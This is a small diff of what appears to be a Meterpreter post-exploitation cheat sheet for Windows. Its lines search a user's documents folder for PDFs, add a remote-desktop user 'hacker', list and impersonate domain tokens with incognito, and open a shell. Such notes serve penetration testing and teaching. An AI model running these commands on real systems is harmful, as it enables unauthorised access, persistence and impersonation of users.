@@ -220,10 +220,8 @@ search -d c:\\documents\ and\ settings\\<user>\\ -f *.pdf
 run getgui -u hacker -p password
 
 use incognito
-help
 list_tokens -u
 impersonate_token <domain>\\<user>
-getuid
 shell
 whoami
 
